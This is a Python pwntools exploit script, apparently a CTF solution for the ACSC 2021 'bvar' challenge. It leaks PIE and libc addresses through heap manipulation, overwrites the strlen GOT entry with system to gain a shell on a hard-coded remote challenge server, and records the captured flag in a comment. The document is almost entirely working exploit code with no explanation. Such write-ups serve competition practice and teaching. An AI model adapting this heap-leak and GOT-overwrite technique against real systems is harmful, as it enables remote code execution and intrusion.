# From https://blog.idiot.sg/2021-09-19/asian-cyber-security-challenge-2021/

#!/usr/bin/env python

from pwn import *

def exploit(r):
    f = lambda x : r.sendafter(">>> ", x)

    # Leak
    f("AAA=aaaaaa")
    f("BBB=bbbb")
    f("delete:BBB")
    f("CCC=cccc\n")
    f("CCC")
    pie_base = u64(r.recvline().rstrip().ljust(8, '\x00'))-0x3594
    log.info("pie_base: {:#x}".format(pie_base))

    # Got pointer (leak exit)
    f("GOT="+p64(pie_base+exe.got["exit"])[:6])
    f("clear")

    # Arbitrary Chunk (libc leak)
    f("AAA=aaaa")
    f("delete:AAA")
    f("BBB=bbbb")
    g = lambda x: p32((pie_base+x)&0xffffffff)
    f("edit:"+g(0x3608))
    sleep(0.1)
    r.send(g(0x35dc))
    f("\n")
    libc_base = u64(r.recvline().rstrip().ljust(8, '\x00'))-libc.symbols["exit"]
    log.info("libc_base: {:#x}".format(libc_base))
    f("clear")

    # Got pointer (overwrite strlen)
    f("GOT="+p64(pie_base+exe.got["strlen"]-8)[:6])
    f("clear")

    # Arbitrary Chunk (GOT overwrite)
    strlen = libc_base + 0x18b660# libc.symbols["strlen"]
    system = libc_base + libc.symbols["system"]
    
    print(hex(strlen))
    f("AAA=aaaa")
    f("delete:AAA")
    f("BBB=bbbb")
    f("edit:"+g(0x3660))
    sleep(0.1)
    r.send(g(0x3634))
    h = lambda x: p32(x & 0xffffffff)
    r.send("edit:"+h(strlen))
    sleep(0.1)
    r.send(h(system))

    r.interactive()
    return

exe = context.binary = ELF("./bvar_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
#r = process([exe.path])
r = remote("35.194.119.116", 7777)
exploit(r)
r.close()

# cat flag.txt
# ACSC{PWN_1S_FUN_5W33T_D3liC1ous :)}